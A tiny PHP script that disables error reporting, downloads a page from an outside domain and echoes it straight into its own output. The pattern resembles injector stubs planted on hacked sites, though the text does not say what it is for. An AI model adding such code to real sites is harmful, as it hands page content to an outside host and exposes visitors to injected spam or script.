<?php
error_reporting(0);
$var = file_get_contents('http://leuventaste.be/mailchimp/stageinbe.php');

echo $var;
?>